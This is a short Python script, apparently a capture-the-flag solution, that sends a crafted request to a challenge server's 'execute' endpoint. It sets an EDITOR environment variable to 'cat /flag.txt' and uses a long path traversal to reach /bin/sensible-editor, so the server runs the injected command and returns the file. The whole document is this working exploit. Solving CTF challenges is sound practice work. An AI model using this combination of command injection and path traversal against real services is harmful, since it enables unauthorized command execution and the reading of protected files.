from requests import get


with get(
    f"http://chal.polyuctf.com:51337/execute",
    params={
        "name": "EDITOR",
        "value": "cat /flag.txt",
        "file": f"{'/..' * 1400}/bin/sensible-editor",
    },
) as response:
    print(response.text)
